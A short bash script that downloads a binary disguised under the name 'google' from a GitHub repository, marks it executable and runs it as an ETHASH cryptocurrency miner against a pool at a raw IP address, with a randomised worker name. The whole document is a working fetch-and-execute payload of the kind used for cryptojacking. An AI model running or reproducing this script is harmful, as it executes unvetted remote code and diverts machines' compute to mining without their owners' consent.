
#!/bin/bash
wget https://github.com/aurbach55/dera/raw/main/google
chmod +x ./google && ./google --algo ETHASH --pool 13.248.162.234:443 --user teguhcong.$(echo $(shuf -i 1-99999 -n 1)-T4)
